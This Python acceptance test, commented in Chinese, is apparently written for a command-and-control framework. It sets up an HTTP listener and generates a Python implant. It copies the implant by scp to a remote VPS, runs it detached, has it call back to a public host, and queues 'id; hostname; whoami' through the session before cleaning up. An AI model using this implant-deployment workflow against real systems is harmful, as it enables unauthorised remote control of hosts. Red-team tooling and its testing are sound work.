#!/usr/bin/env python3
"""公网 HTTP C2 真机 E2E：真实服务 + 公网映射 + 公网 VPS 植入端。

用法（服务已启动且可创建监听器；目标为授权测试 VPS）：
  C2_BASE=http://127.0.0.1:18930 C2_PASSWORD='...' \
  C2_PUBLIC_HOST=39.89.211.55 C2_HTTP_PORT=39443 \
  C2_VPS_SSH=root@113.20.3.124 C2_VPS_KEY=~/.ssh/id_ed25519_113.20.3.124 \
  python3 scripts/acceptance/c2_public_http.py
"""
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

BASE = os.environ.get("C2_BASE", "http://127.0.0.1:18930")
PW = os.environ.get("C2_PASSWORD", "")
PUBLIC = os.environ.get("C2_PUBLIC_HOST", "")
HTTP_PORT = int(os.environ.get("C2_HTTP_PORT", "39443"))
VPS = os.environ.get("C2_VPS_SSH", "")
KEY = os.path.expanduser(os.environ.get("C2_VPS_KEY", "~/.ssh/id_ed25519"))
TOKEN = None

def req(method, path, body=None, token=None, timeout=30):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, method=method)
    if body is not None:
        r.add_header("Content-Type", "application/json")
    tok = token if token is not None else TOKEN
    if tok:
        r.add_header("Authorization", "Bearer " + tok)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", "replace")
            return resp.status, (json.loads(raw) if raw else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, (json.loads(raw) if raw else None)
        except Exception:
            return e.code, raw

def ssh(cmd):
    return subprocess.run(["ssh", "-i", KEY, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", VPS, cmd],
                          capture_output=True, text=True, timeout=90)

def main():
    global TOKEN
    if not (PW and PUBLIC and VPS):
        print("need C2_PASSWORD / C2_PUBLIC_HOST / C2_VPS_SSH", file=sys.stderr)
        return 2
    code, body = req("GET", "/api/auth/status", token="")
    if not body.get("initialized"):
        code, body = req("POST", "/api/auth/init", {"password": PW}, token="")
    else:
        code, body = req("POST", "/api/auth/login", {"username": "ARTEX", "password": PW}, token="")
    TOKEN = body.get("token")
    if not TOKEN:
        print("auth failed", code, body, file=sys.stderr)
        return 1
    req("PUT", "/api/settings", {"c2_allow_non_loopback": True})
    req("POST", "/api/c2/enable", {"enabled": True})
    c, l = req("POST", "/api/c2/listeners", {"name": "pub-http-e2e", "kind": "http", "bind_host": "0.0.0.0", "bind_port": HTTP_PORT})
    if c != 200 or not l.get("id"):
        print("create listener failed", c, l, file=sys.stderr)
        return 1
    lid = l["id"]
    req("POST", "/api/c2/listeners/%d/start" % lid, {})
    base_url = "http://%s:%d" % (PUBLIC, HTTP_PORT)
    c, imp = req("GET", "/api/c2/implant?listener_id=%d&lang=python&base_url=%s" % (lid, base_url))
    if c != 200 or not imp.get("content"):
        print("implant failed", c, imp, file=sys.stderr)
        return 1
    local = "/tmp/c2_public_http_implant.py"
    remote = "/tmp/c2_public_http_implant.py"
    open(local, "w").write(imp["content"])
    r = subprocess.run(["scp", "-i", KEY, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", local, VPS + ":" + remote], capture_output=True, text=True, timeout=90)
    if r.returncode != 0:
        print("scp failed", r.stderr, file=sys.stderr)
        return 1
    ssh("setsid -f python3 %s >/tmp/c2_public_http_implant.log 2>&1" % remote)
    sess = None
    deadline = time.time() + 40
    while time.time() < deadline:
        c, d = req("GET", "/api/c2/sessions?active=1")
        for x in (d.get("sessions") or []):
            if x.get("listener_id") == lid:
                sess = x
                break
        if sess:
            break
        time.sleep(1)
    if not sess:
        print("no session online", file=sys.stderr)
        return 1
    c, t = req("POST", "/api/c2/sessions/%d/tasks" % sess["id"], {"command": "id; hostname; whoami"})
    if c != 200 or not t.get("id"):
        print("queue failed", c, t, file=sys.stderr)
        return 1
    task = None
    deadline = time.time() + 40
    while time.time() < deadline:
        c, d = req("GET", "/api/c2/tasks?session_id=%d&limit=20" % sess["id"])
        for x in (d.get("tasks") or []):
            if x.get("id") == t["id"]:
                task = x
                break
        if task and task.get("status") in ("success", "failed"):
            break
        time.sleep(1)
    print(json.dumps({"listener_id": lid, "session": sess, "task": task}, ensure_ascii=False, default=str))
    ssh("pkill -f c2_public_http_implant 2>/dev/null; rm -f " + remote + " /tmp/c2_public_http_implant.log")
    req("POST", "/api/c2/listeners/%d/stop" % lid, {})
    req("DELETE", "/api/c2/listeners/%d" % lid)
    return 0 if task and task.get("status") == "success" else 1

if __name__ == "__main__":
    sys.exit(main())
